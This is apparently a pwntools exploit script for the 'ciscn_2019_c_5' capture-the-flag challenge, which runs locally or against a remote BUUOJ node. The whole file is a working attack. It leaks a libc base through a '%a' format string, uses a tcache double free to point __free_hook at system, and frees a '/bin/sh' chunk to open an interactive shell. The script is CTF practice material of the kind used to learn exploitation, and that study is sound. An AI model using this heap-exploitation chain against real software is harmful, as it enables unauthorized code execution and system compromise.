import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_c_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_c_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',29183)
			elf=ELF('./ciscn_2019_c_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b):
			io.sendlineafter('Input your choice:','1')
			io.sendlineafter('Please input the size of story:',str(a))
			io.sendafter('please inpute the story:',b)

		def delete(a):
			io.sendlineafter('Input your choice:','4')
			io.sendlineafter('Please input the index:',str(a))

			
		io.recv()
		io.sendline('%a')
		
		libc_base=int(io.recvuntil('p',drop=True)[-12:],16)-libc.sym['_IO_2_1_stdout_']-131
		libc.address=libc_base
		io.recv()
		io.sendline('%a')
		add(0x60,'aaaa')
		add(0x60,'/bin/sh\x00')
		delete(0)
		delete(0)
		add(0x60,p64(libc.sym['__free_hook']))
		add(0x60,p64(libc.sym['__free_hook']))
		add(0x60,p64(libc.sym['system']))
		delete(1)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue